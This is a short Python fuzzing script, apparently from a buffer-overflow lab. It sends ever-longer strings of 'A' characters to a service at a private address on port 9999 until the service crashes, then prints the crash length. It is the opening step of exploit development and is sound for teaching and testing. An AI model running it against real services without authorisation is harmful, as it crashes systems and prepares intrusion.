#!/usr/bin/env python3

import socket, time, sys

ip = "10.0.5.2"

port = 9999
timeout = 5
prefix = ""

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print(" _______________________________")
    print("|                               |")
    print("| Fuzzing crashed at {} bytes |".format(len(string) - len(prefix)))
    print("|_______________________________|")
    print("*                               *")
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
